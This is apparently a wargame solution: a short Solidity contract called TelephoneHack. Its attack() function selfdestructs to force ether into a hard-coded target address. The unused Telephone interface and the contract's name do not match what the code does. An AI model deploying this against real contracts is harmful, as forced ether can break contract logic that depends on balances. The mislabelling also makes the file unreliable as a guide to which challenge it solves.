/**
 *Submitted for verification at Etherscan.io on 2022-10-19
*/

// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity >=0.8.0;

interface Telephone {
      function changeOwner(address _owner) external;
}

contract TelephoneHack {
    address payable target = payable(0x9eDc16a36A50D665E2908FeFcaCb97AE056A9d28);

    function attack() public payable {
        selfdestruct(target);
    }
}